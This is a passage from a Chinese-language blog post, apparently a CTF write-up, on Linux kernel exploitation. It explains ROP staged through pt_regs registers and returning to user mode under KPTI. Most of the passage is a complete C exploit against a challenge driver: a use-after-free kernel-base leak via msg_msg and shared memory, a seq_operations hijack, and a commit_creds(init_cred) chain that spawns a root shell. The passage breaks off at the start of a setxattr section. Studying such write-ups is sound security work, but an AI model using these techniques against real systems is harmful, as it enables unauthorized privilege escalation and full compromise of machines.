*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>示意图如下</p><p><img src="https://s2.loli.net/2023/01/21/xhIPKTs3HRXDfO6.png" alt=""></p><p>其中从r8-r15都是很少用到的，我们可以控制其来布置ROP。比如说我们通过动调发现了劫持控制流执行某个gadget的时候此时rsp距离我们的的pt_regs的距离，我们便可以通过类似<code>add rsp,val ;ret</code>的操作将栈迁移到<code>pt_regs</code>上以便进一步利用。大部分情况下这个长度应该是够的，如果不够我们可以想办法进行类似泄露可控堆地址然后写ROP栈迁移的操作。</p><p>关于这个<code>add rsp,val ;ret</code>gadget的寻找如果用ROPgadget的话感觉还是挺难找到的，需要注意的是不一定是ret结尾，如果jmp到ret其实也是一样的，但是这个容易被忽视。可以尝试利用IDApython或者pwntools进行search的方式(就是<code>img.search(asm(&quot;xxx&quot;))).__next__()</code></p><p>还有需要提到的是关于<code>swapgs_restore_regs_and_return_to_usermode</code>这个函数，当开启了<code>KPTI</code>的时候，用户态下和内核态下的页表是有差异的，其差异是用<code>cr3</code>寄存器标识的，我们不能通过简单的<code>swapgs;iretq</code>的方式返回用户态，而是需要通过这个函数进行切换。</p><p>而我们执行的时候并不能直接从头开始，尤其是利用了<code>pt_regs</code>的情况下，因为这个函数的开始有如下操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81e00ed0 &lt;swapgs_restore_regs_and_return_to_usermode&gt;:     jmp    0xffffffff81e00eeb </span><br><span class="line">0xffffffff81e00ed2 &lt;swapgs_restore_regs_and_return_to_usermode+2&gt;:   mov    ecx,0x48</span><br><span class="line">0xffffffff81e00ed7 &lt;swapgs_restore_regs_and_return_to_usermode+7&gt;:   mov    rdx,QWORD PTR gs:0x1ad08</span><br><span class="line">0xffffffff81e00ee0 &lt;swapgs_restore_regs_and_return_to_usermode+16&gt;:  and    edx,0xfffffffe</span><br><span class="line">0xffffffff81e00ee3 &lt;swapgs_restore_regs_and_return_to_usermode+19&gt;:  mov    eax,edx</span><br><span class="line">0xffffffff81e00ee5 &lt;swapgs_restore_regs_and_return_to_usermode+21&gt;:  shr    rdx,0x20</span><br><span class="line">0xffffffff81e00ee9 &lt;swapgs_restore_regs_and_return_to_usermode+25&gt;:  wrmsr</span><br><span class="line">0xffffffff81e00eeb &lt;swapgs_restore_regs_and_return_to_usermode+27&gt;:  pop    r15</span><br><span class="line">0xffffffff81e00eed &lt;swapgs_restore_regs_and_return_to_usermode+29&gt;:  pop    r14</span><br><span class="line">0xffffffff81e00eef &lt;swapgs_restore_regs_and_return_to_usermode+31&gt;:  pop    r13</span><br><span class="line">0xffffffff81e00ef1 &lt;swapgs_restore_regs_and_return_to_usermode+33&gt;:  pop    r12</span><br><span class="line">0xffffffff81e00ef3 &lt;swapgs_restore_regs_and_return_to_usermode+35&gt;:  pop    rbp</span><br><span class="line">0xffffffff81e00ef4 &lt;swapgs_restore_regs_and_return_to_usermode+36&gt;:  pop    rbx</span><br><span class="line">0xffffffff81e00ef5 &lt;swapgs_restore_regs_and_return_to_usermode+37&gt;:  pop    r11</span><br><span class="line">0xffffffff81e00ef7 &lt;swapgs_restore_regs_and_return_to_usermode+39&gt;:  pop    r10</span><br><span class="line">0xffffffff81e00ef9 &lt;swapgs_restore_regs_and_return_to_usermode+41&gt;:  pop    r9</span><br><span class="line">0xffffffff81e00efb &lt;swapgs_restore_regs_and_return_to_usermode+43&gt;:  pop    r8</span><br><span class="line">0xffffffff81e00efd &lt;swapgs_restore_regs_and_return_to_usermode+45&gt;:  pop    rax</span><br><span class="line">0xffffffff81e00efe &lt;swapgs_restore_regs_and_return_to_usermode+46&gt;:  pop    rcx</span><br><span class="line">0xffffffff81e00eff &lt;swapgs_restore_regs_and_return_to_usermode+47&gt;:  pop    rdx</span><br><span class="line">0xffffffff81e00f00 &lt;swapgs_restore_regs_and_return_to_usermode+48&gt;:  pop    rsi</span><br><span class="line">0xffffffff81e00f01 &lt;swapgs_restore_regs_and_return_to_usermode+49&gt;:  mov    rdi,rsp</span><br><span class="line">0xffffffff81e00f04 &lt;swapgs_restore_regs_and_return_to_usermode+52&gt;:  mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">0xffffffff81e00f0d &lt;swapgs_restore_regs_and_return_to_usermode+61&gt;:  push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81e00f10 &lt;swapgs_restore_regs_and_return_to_usermode+64&gt;:  push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81e00f13 &lt;swapgs_restore_regs_and_return_to_usermode+67&gt;:  push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81e00f16 &lt;swapgs_restore_regs_and_return_to_usermode+70&gt;:  push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81e00f19 &lt;swapgs_restore_regs_and_return_to_usermode+73&gt;:  push   QWORD PTR [rdi+0x10]</span><br><span class="line">0xffffffff81e00f1c &lt;swapgs_restore_regs_and_return_to_usermode+76&gt;:  push   QWORD PTR [rdi]</span><br><span class="line">0xffffffff81e00f1e &lt;swapgs_restore_regs_and_return_to_usermode+78&gt;:  push   rax</span><br></pre></td></tr></table></figure><p>如果直接从头运行，由于<code>pt_regs</code>在内核栈底，而且我们已经利用其ROP了一段，再进行这些pop操作很容易让rsp超出当前页面造成访问非法地址然后panic掉。所以一个解决方法时，我们利用到了哪一段寄存器，相应的寄存器就不pop了，按顺序直接从下一个寄存器运行。比如我们利用了r15-r12来写了ROP，其中r12 =&lt; swapgs_restore_regs_and_return_to_usermode+x,&gt;然后我们ROP执行<swapgs_restore_regs_and_return_to_usermode+x>处的指令，这时rsp指向了<code>pt_regs</code>的rbp寄存器，那么r12就应该是对应着<code>pop rbp</code>的指令，也就是<swapgs_restore_regs_and_return_to_usermode+35>。</p><p>最终exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82850580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff8100d3d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_VAL_RET 0xffffffff8111347b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE    0xffffffff81e00ef4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RET 0xffffffff81e01058</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_CLOSE 0xffffffff8124b180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8102b4df</span></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">int</span> dev_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Error</span><span class="params">(<span class="keyword">char</span>* error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m [?] %s\033[0m\n&quot;</span>,error);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Doing</span><span class="params">(<span class="keyword">char</span> * Doing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m [*] %s \033[0m\n&quot;</span>,Doing);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Done</span><span class="params">(<span class="keyword">char</span> *Done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] %s \033[0m\n&quot;</span>,Done);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span>-<span class="keyword">sizeof</span>(struct msg_msg)+SHM_SIZE-<span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;uafmsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> index;</span><br><span class="line">    <span class="keyword">int32_t</span> len;</span><br><span class="line">    <span class="keyword">void</span>* ptr;</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;request;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int32_t</span> index,<span class="keyword">int32_t</span> len,<span class="keyword">void</span> * ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.len = len;</span><br><span class="line">    req.ptr = ptr;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int32_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[X] Shmget Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[X] Shmat Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Doing(<span class="string">&quot;Start Leaking addr&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">void</span>* recv = <span class="built_in">malloc</span>(<span class="number">0x1018</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(qid&lt;<span class="number">0</span>)</span><br><span class="line">        Error(<span class="string">&quot;Make Queue Error&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;uafmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(uafmsg));</span><br><span class="line">    writeMsg(qid,&amp;uafmsg,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* shm_addr=open_shm_file();</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) <span class="comment">//****注意要释放，否则会kernel panic</span></span><br><span class="line">        Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    readMsg(qid,recv,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((<span class="keyword">uint64_t</span>*)recv)[<span class="number">0x1fb</span>]- <span class="number">0x19ac6c0</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;%lx&quot;,((uint64_t*)recv)[0x1fb]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] kernel_base_addr is %lx \033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(recv);</span><br><span class="line">    Done(<span class="string">&quot;leaking Dne&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getR00t</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Fail to get root\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Success!!! root now\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret;</span><br><span class="line"><span class="keyword">uint64_t</span> init_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev_fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Error(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> offset  = leak_addr()-BASE;</span><br><span class="line">    <span class="keyword">uint64_t</span>* buf = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = ADD_RSP_VAL_RET+offset;</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    pop_rdi_ret = POP_RDI_RET+offset;</span><br><span class="line">    init_cred = INIT_CRED+offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS+offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE+offset;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x9999999999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x8888888888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x7777777777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x6666666666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x5555555555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x4444444444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://s2.loli.net/2023/01/21/h6KfLTtcP1vMUyC.png" alt=""></p><h3 id="利用setxattr进行写"><a href="#利用setxattr进行写" class="headerlink" title="利用setxattr进行写"></a>利用setxattr进行写</h3><p><code>setxattr</code>可以为我们提供近乎任意大小的内核空间object分配，其调用链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在setxattr函数中有如下逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 